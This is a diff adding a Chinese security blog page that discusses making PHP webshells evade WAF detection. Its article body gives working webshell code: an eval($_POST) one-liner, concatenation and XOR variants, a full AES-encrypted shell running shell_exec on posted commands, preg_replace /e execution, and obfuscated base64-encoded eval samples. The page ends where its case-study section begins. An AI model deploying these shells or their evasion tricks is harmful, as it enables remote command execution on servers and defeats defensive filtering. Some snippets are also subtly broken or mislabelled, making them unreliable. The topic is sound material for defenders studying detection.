@@ -1,0 +1,1916 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>webshell免杀的一些思考 | wh1t3zer</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">loading...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <h3 class="drawer-box-head_title">wh1t3zer</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">Tags</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/about" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友链</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(6)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(6)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(6)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/huoban">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/homepage/index.html">
+                      
+                      <i class="fas fa-paper-plane" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/wh1t3zer">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">wh1t3zer</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="Tags">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">Tags</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/about" class="menu-item-link" title="关于">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友链">
+                  
+                  <span class="name">友链</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/huoban">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/homepage/index.html">
+                      
+                      <i class="fas fa-paper-plane" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/wh1t3zer" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/img89.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        webshell免杀的一些思考
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2024-10-26 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/webshell/" class="post-detail-header_category">
+              webshell
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>之前hw遇到多挺多次waf，想最初还是找大哥要来多个webshell的免杀样本去绕，随着次数增多，开始也有意无意去研究免杀的手段，借这篇文章去做一个简要的webshell免杀分析，就当做知识面的巩固。</p>
+<h2 id="0x01原理"><a href="#0x01原理" class="headerlink" title="0x01原理"></a>0x01原理</h2><p>免杀绕过waf的原理实际上也是借助编码、加密的手段去绕过waf的规则，只要手段足够多，就能绕过大部分waf。相反，waf的规则足够多，也能抵挡大部分的webshell。</p>
+<p>以一个php一句话木马为例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码就是通过eval函数去执行传过来的cmd参数，很显然，这个函数已经是经过waf的严格审核，那如何去对这个函数去做手段？</p>
+<h3 id="1、函数替代法"><a href="#1、函数替代法" class="headerlink" title="1、函数替代法"></a>1、函数替代法</h3><p>那时候的waf规则还不够完善，而且php的执行命令还有若干个，比如shell_exec、system、assert、passthru、exec</p>
+<p><strong>system</strong></p>
+<p>执行命令并返回结果</p>
+<p><strong>shell_exec</strong></p>
+<p>执行命令不返回结果</p>
+<p><strong>assert</strong></p>
+<p>一般称为断言，但是可以执行命令，不过要注意的是在php7.1之后assert没有执行命令功能</p>
+<p>这些函数可以替换eval，不过现在这个时代我相信这些函数大大小小都是被waf监控住的</p>
+<p>常用的函数剩下一个system，因为这个在很多模块都可能有所以不会那么严格</p>
+<h3 id="2、拼接法"><a href="#2、拼接法" class="headerlink" title="2、拼接法"></a>2、拼接法</h3><p>这里是利用php的一个致命缺陷，就是可以通过 <strong>.</strong> 连接字符串，比如echo $a.$b</p>
+<p>这样会拼接成ab。那可以使用该方法对敏感函数拼接起来</p>
+<p>‘s’.’y’.’s’.’t’.’e’.’m’</p>
+<p>其他语言则可以用+号拼接</p>
+<p>通过拼接，去完善 <strong>$_POST</strong> 或 <strong>$_GET</strong> 传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">eval</span>;</span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$a</span>); <span class="comment">#    =&gt; eval($_POST[&#x27;cmd&#x27;])</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3、异或法"><a href="#3、异或法" class="headerlink" title="3、异或法"></a>3、异或法</h3><p>异或也就是使用xor加密函数，对payload进行一个异或的操作实现加密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="string">&quot;sadwa21s21lm1&quot;</span>;</span><br><span class="line"><span class="variable">$encoded</span> = <span class="variable">$input</span> ^ <span class="variable">$key</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$encoded</span> ^ <span class="variable">$key</span>);  </span><br></pre></td></tr></table></figure>
+
+<h3 id="4、AES加密"><a href="#4、AES加密" class="headerlink" title="4、AES加密"></a>4、AES加密</h3><p>这种方法对现代waf的免杀效果还是比较明显，因为存在pcb和cbc的加密模式和随机数密钥，可以从静态层面上绕过大部分waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// AES 密钥和初始向量（IV），保持一致性</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;secretkey&#x27;</span>; <span class="comment">// 16, 24, 或 32 字节长的密钥</span></span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&#x27;iviviv&#x27;</span>; <span class="comment">// 16 字节长的 IV</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span>, <span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;AES-256-CBC&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span>, <span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;AES-256-CBC&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收加密命令并解密执行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$encryptedCmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$decryptedCmd</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$encryptedCmd</span>, <span class="variable">$key</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$decryptedCmd</span>) &#123;</span><br><span class="line">        <span class="comment">// 执行解密后的命令</span></span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$decryptedCmd</span>);</span><br><span class="line">        <span class="comment">// 将结果加密后返回</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="variable">$output</span>, <span class="variable">$key</span>, <span class="variable">$iv</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Decryption failed&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;No command received&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="5、字符串替换"><a href="#5、字符串替换" class="headerlink" title="5、字符串替换"></a>5、字符串替换</h3><p>在php中有个replace函数，可以输入一个错误的字符串，并将其替换为命令执行函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">test</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span> . <span class="string">&quot;val&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其中还有一个函数比较特别</p>
+<p>preg_replace，其中&#x2F;e模式是用来执行代码的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;title&gt;(.+?)&lt;\/title&gt;/ies&quot;</span>, <span class="string">&#x27;funfunc(&quot;\1&quot;)&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="comment"># preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$str）</span></span><br></pre></td></tr></table></figure>
+
+<p>这里说明下preg_replace的几个重要点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</span><br><span class="line">2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">4、/s 与/m相对，单行模式匹配。</span><br><span class="line">5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br><span class="line">6、/x 忽略空白模式。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\\1是反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line">现在这里是\1，就匹配第一个</span><br></pre></td></tr></table></figure>
+
+<p><strong>拓展</strong></p>
+<p>在waf禁用了preg_replace的情况下可以用其他两个函数</p>
+<p><strong>mb_ereg_replace、mb_eregi_replace</strong>，使用的方法相同，都是&#x2F;e执行</p>
+<h3 id="6、编码绕过"><a href="#6、编码绕过" class="headerlink" title="6、编码绕过"></a>6、编码绕过</h3><p>base64编码、rot13编码、base32编码，unicode编码、url编码都可以去尝试</p>
+<h3 id="7、代码混淆"><a href="#7、代码混淆" class="headerlink" title="7、代码混淆"></a>7、代码混淆</h3><p>还是以php为例</p>
+<p>这里的混淆已经有好多年的历史了，不妨再提一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OOO0O0O00</span>=<span class="keyword">__FILE__</span>;<span class="variable">$OOO000000</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72&#x27;</span>);<span class="variable">$OO00O0000</span>=<span class="number">7088</span>;<span class="variable">$OOO0000O0</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">4</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">9</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO000000</span>&#123;<span class="number">2</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">13</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">16</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO0000O0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">11</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">12</span>&#125;.<span class="variable">$OOO0000O0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$O0O0000O0</span>=<span class="string">&#x27;OOO0000O0&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这种代码是否看的头大，陌生又熟悉，实际上是利用php动态变量的属性+base64编码+自定义变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O00OO0000</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$O0O0OOO0</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$O0O00O0O</span> = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line"><span class="variable">$O00OO0000</span>(<span class="string">&quot;echo &#x27;Hello&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$O0O0OOO0</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是这种</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$O0O0O</span> = <span class="string">&quot;e&quot;</span>.<span class="string">&quot;v&quot;</span>.<span class="string">&quot;al&quot;</span>;</span><br><span class="line"><span class="variable">$O0O0O</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c3lzdGVtKCdscycpOw==&#x27;</span>)); <span class="comment">// 解码后执行 `system(&#x27;ls&#x27;)`</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># eval(systel(`ls`));</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02案例分析"><a href="#0x02案例分析" class="headerlink" title="0x02案例分析"></a>0x02案例分析</h2><p>找几个免杀的样本来简要分析下里面的技术</p>
+<p>以XG拟态为例</p>
